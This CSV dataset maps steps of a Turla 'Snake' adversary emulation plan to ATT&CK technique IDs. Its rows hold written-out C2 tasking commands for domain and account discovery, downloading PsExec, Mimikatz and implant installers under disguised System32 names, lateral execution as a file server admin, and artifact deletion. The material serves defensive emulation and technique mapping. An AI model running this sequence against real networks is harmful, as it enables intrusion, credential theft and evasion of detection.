org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_snake,turla_snake,unknown,turla_snake::11,11,Search for File Server Administrator process in running processes (Adversary),"id: 4f222cd4-4c53-4cf5-869f-335a51711d8a | name: Search for File Server Administrator process in running processes (Adversary) | description: Task the Snake rootkit to run the process discovery command.
 | tactic: Discovery | technique: attack_id: T1057 | name: Process Discovery | procedure_group: procedure_discovery | procedure_step: 13.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 3, ""proc"": ""tasklist.exe"", ""args"": ""/v""}' --task-wait-timeout 60 | grep '#{file.server.admin}' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::12,12,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::13,13,Enumerate file server admin groups (Adversary),"id: 5dbc34ff-eb4d-4897-8c4e-8288e5dd9e88 | name: Enumerate file server admin groups (Adversary) | description: Execute the discovery command to confirm the user is in the file server admin's groups.
 | tactic: Discovery | technique: attack_id: T1087.002 | name: Account Discovery: Domain Account | procedure_group: procedure_discovery | procedure_step: 13.A.4 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 3, ""proc"": ""net.exe"", ""args"": ""user /domain #{file.server.admin}""}' --task-wait-timeout 60 | grep 'File Server Admins' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::14,14,Account Discovery: Domain Account,attack_id: T1087.002 | name: Account Discovery: Domain Account,"[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::15,15,Enumerate mapped network drives (Adversary),"id: 6315f9e9-a6ee-46f2-b846-24f9c3c219c9 | name: Enumerate mapped network drives (Adversary) | description: Execute the discovery command to the drive mapped to the file server.
 | tactic: Discovery | technique: attack_id: T1049 | name: System Network Connections Discovery | procedure_group: procedure_discovery | procedure_step: 13.A.8 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 3, ""proc"": ""net.exe"", ""args"": ""use"", ""runas"": ""#{network.domain.name}\\#{first.target.user}""}' --task-wait-timeout 60 | grep #{second.target.host} -i
 | input_arguments: second.target.host: description: The hostname of the second target host. | type: string | default: berzas | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::16,16,System Network Connections Discovery,attack_id: T1049 | name: System Network Connections Discovery,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::17,17,Download PsExec (Adversary),"id: 9c65d9cc-6f72-471c-80e0-4c3029fc5e6d | name: Download PsExec (Adversary) | description: Task the implant to download PsExec.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 14.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 4, ""file"": ""PsExec.exe"", ""dest"":""C:\\Windows\\System32\\file_svc_mgr.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::18,18,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::19,19,Download the 2nd Snake installer (Adversary),"id: f6c54eb3-f066-4721-812f-0bf6bfea01fc | name: Download the 2nd Snake installer (Adversary) | description: Task the implant to download the 2nd Snake installer.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 14.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 4, ""file"": ""installer_v2.exe"", ""dest"":""C:\\Windows\\System32\\cmu_svc_v2.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::20,20,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::21,21,Execute PsExec as the File Server Administrator (Adversary),"id: 0970d7d6-279a-4ad8-a334-cfe0b5e7e0a6 | name: Execute PsExec as the File Server Administrator (Adversary) | description: Run the following command to execute PsExec as the file server admin, which will run the Snake installer on the file server
 | tactic: Execution | technique: attack_id: T1569.002 | name: System Services: Service Execution | procedure_group: procedure_execution | procedure_step: 14.A.4 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 3, ""proc"": ""C:\\Windows\\System32\\file_svc_mgr.exe"", ""args"":""\\\\#{second.target.host} -accepteula -s -c C:\\Windows\\System32\\cmu_svc_v2.exe"", ""runas"":""#{network.domain.name}\\#{file.server.admin}""}' --task-wait-timeout 120
 | timeout: 120 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::22,22,System Services: Service Execution,attack_id: T1569.002 | name: System Services: Service Execution,"[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::23,23,Delete artifacts from first target host (Adversary),"id: 057a6b9b-36d6-456d-aa28-66e61295dd9c | name: Delete artifacts from first target host (Adversary) | description: After the new beacon is received, remove files from the first target.
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 14.A.6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.snake.id} '{""type"": 1, ""command"": ""del /Q C:\\Windows\\System32\\file_svc_mgr.exe C:\\Windows\\System32\\cmu_svc_v2.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.snake.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::24,24,Indicator Removal: File Deletion,attack_id: T1070.004 | name: Indicator Removal: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::25,25,Check if ActiveDirectory is installed (Adversary),"id: 79dae739-fd89-4842-946e-a4675110814e | name: Check if ActiveDirectory is installed (Adversary) | description: Task Snake to check if the ActiveDirectory PowerShell module is installed.
 | tactic: Execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: Powershell | procedure_group: procedure_execution | procedure_step: 15.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Get-Module -ListAvailable -Name ActiveDirectory""}' --task-wait-timeout 60 | grep ActiveDirectory -i
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::26,26,Command and Scripting Interpreter: Powershell,attack_id: T1059.001 | name: Command and Scripting Interpreter: Powershell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::27,27,Enumerate Active Directory groups (Adversary),"id: 70a19730-04e9-45be-8463-7a359eaee657 | name: Enumerate Active Directory groups (Adversary) | description: Task Snake to collect a list of Active Directory groups containing the word ""management"", as members of these groups will likely have elevated permissions on the network. Confirm existence of a ""Server Management"" group.
 | tactic: Discovery | technique: attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 15.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \""management\"" | Select Name""}' --task-wait-timeout 60 | grep 'Server Management' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::28,28,Permission Group Discovery: Domain Groups,attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups,"[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::29,29,Enumerate accounts belonging to the Server Management domain group (Adversary),"id: bb06008c-561b-4a98-992e-fb7a0432aa45 | name: Enumerate accounts belonging to the Server Management domain group (Adversary) | description: Task Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla which users to target next. Confirm the domain admin user is a member.
 | tactic: Discovery | technique: attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 15.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \""Server Management\"" | Select Name,SamAccountName""}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
 | input_arguments: domain.admin.user: description: The username of a domain admin. | type: string | default: ZilvinasAdmin | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::30,30,Permission Group Discovery: Domain Groups,attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups,"[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::31,31,Enumerate accounts belonging to the Domain Admins domain group (Adversary),"id: 8649c19c-0e25-43f3-a267-e0c0c92dd74f | name: Enumerate accounts belonging to the Domain Admins domain group (Adversary) | description: Task Snake to obtain the usernames of accounts within the Domain Admins domain group. Confirm the domain admin user is a member.
 | tactic: Discovery | technique: attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 15.A.3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \""Domain Admins\"" | Select Name,SamAccountName""}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::32,32,Permission Group Discovery: Domain Groups,attack_id: T1069.001 | name: Permission Group Discovery: Domain Groups,"[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::33,33,Enumerate account information (Adversary),"id: d761e02e-fea4-457e-a434-aa49383b7996 | name: Enumerate account information (Adversary) | description: Task Snake to discover domain users.
 | tactic: Discovery | technique: attack_id: T1087.002 | name: Account Discovery: Domain Account | procedure_group: None | procedure_step: 15.A.4 | platforms: linux: sh: command: output=$(./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName""}' --task-wait-timeout 60);
echo $output | grep '#{second.target.user}' -iw && echo $output | grep '#{domain.admin.user}' -i
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::34,34,Account Discovery: Domain Account,attack_id: T1087.002 | name: Account Discovery: Domain Account,"[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::35,35,Enumerate domain computer information (Adversary),"id: 44daae27-4c78-4a38-9a68-88aeabd87a32 | name: Enumerate domain computer information (Adversary) | description: Task Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).
 | tactic: Discovery | technique: attack_id: T1018 | name: Remote System Discovery | procedure_group: None | procedure_step: 15.A.5 | platforms: linux: sh: command: output=$(./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 2, ""command"": ""$ProgressPreference = \""SilentlyContinue\""; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description""}' --task-wait-timeout 60);
echo $output | grep '#{second.target.user} Workstation' -i && echo $output | grep '#{fourth.target.host}' -i
 | input_arguments: fourth.target.host: description: The hostname of the fourth target host. | type: string | default: drebule | second.target.user: description: The username of the second target host. | type: string | default: Zilvinas | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::36,36,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::37,37,Download Mimikatz to file server (Adversary),"id: bc88a0f3-245f-46a7-be47-42538fd0521d | name: Download Mimikatz to file server (Adversary) | description: Task Snake to download Mimikatz to the file server.
 | tactic: Commmand and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 16.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 4, ""file"": ""mimikatz.exe"", ""dest"": ""C:\\Windows\\System32\\loadperf.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::38,38,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::39,39,Download PsExec to the file server (Adversary),"id: 55bef1eb-e1b5-46c6-94b9-a9637688d114 | name: Download PsExec to the file server (Adversary) | description: Task Snake to download PsExec to the file server.
 | tactic: Commmand and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 16.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 4, ""file"": ""PsExec.exe"", ""dest"": ""C:\\Windows\\System32\\fs_mgr.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::40,40,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::41,41,Download 3rd Snake installer to the file server (Adversary),"id: 095324d9-a6e8-4964-a5ba-92fff6907c2e | name: Download 3rd Snake installer to the file server (Adversary) | description: Task Snake to download the 3rd Snake installer to the file server.
 | tactic: Commmand and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 16.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.snake.id} '{""type"": 4, ""file"": ""installer_v3.exe"", ""dest"":""C:\\Windows\\System32\\cmu_svc.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.snake.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
turla_snake,turla_snake,unknown,turla_snake::42,42,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_snake.yaml,yaml_regex_extract,high
